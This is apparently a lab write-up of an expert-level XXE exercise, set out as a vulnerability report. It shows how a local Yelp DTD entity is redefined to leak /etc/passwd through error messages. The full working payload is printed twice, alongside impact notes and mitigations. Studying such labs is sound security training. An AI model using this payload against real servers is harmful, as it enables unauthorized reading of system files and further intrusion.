
# 1. Exploiting XXE to Retrieve Data by Repurposing a Local DTD

## 2. CVSS Score

**CVSS v3.1 Base Score: 7.5 (High)**
**CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)**

---

## 3. OWASP Top 10 Reference

* **A05:2021 – Security Misconfiguration**
* **A04:2021 – Insecure Design**

---

## 4. Description of Vulnerability

This lab involves an advanced XML External Entity (XXE) injection technique by **redefining an entity from an existing local DTD file** on the server.

Although the application does not show the XML response directly, it leaks information through **error messages**, which can be leveraged to extract the contents of sensitive local files like `/etc/passwd`. The attack uses **indirect parameter entity expansion** and **repurposes a local DTD**, commonly found on Linux systems with GNOME installed.

---

## 5. Detailed Explanation of What We Performed

We exploited the server’s access to a known local DTD file (`/usr/share/yelp/dtd/docbookx.dtd`) and redefined one of its internal entities (`ISOamso`) to include a secondary payload that extracts the contents of `/etc/passwd`.

When the server processes the crafted XML, it expands the redefined entity, leading to a **file path error**, which leaks the contents of the target file inside the **error message** shown in the application.

---

## 6. Step-by-Step Procedure

### Step 1: Intercept the XML Request

1. Visit any product page on the lab site.
2. Click **“Check stock”**.
3. Use **Burp Suite** to **intercept the POST request** sent to the server.

---

### Step 2: Modify the XML Payload

2. Modify the intercepted request body to include a **malicious DOCTYPE** declaration that references and redefines an entity inside the Yelp DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### Step 3: Forward the Request and Observe the Response

3. Forward the modified request.
4. The application returns an **error message** which now includes content from `/etc/passwd`, proving that the entity redefinition and expansion succeeded.

---

## 7. Impact of the Vulnerability

* **Server-Side File Disclosure**: Enables attackers to read arbitrary files.
* **Server Misconfiguration Exposure**: Leaks sensitive server behavior through DTD parsing.
* **Attack Chain Possibility**: The retrieved information could assist in privilege escalation, lateral movement, or further injection.

---

## 8. Recommendations and Mitigations

* **Disable External and Parameter Entities** in XML parsers.
* **Use XML parsers with secure defaults**, such as those that ignore DTDs or disallow parameter entity expansion.
* **Avoid parsing untrusted XML** unless absolutely necessary.
* **Log error responses securely**, and do not expose internal file paths or content in error messages.

---

## 9. References

* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [PortSwigger XXE Labs – Expert Level](https://portswigger.net/web-security/xxe)

---

## 10. Proof of Concept

### Malicious Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Result:

The server throws an error while trying to access a non-existent file path that contains the expanded contents of `/etc/passwd`.

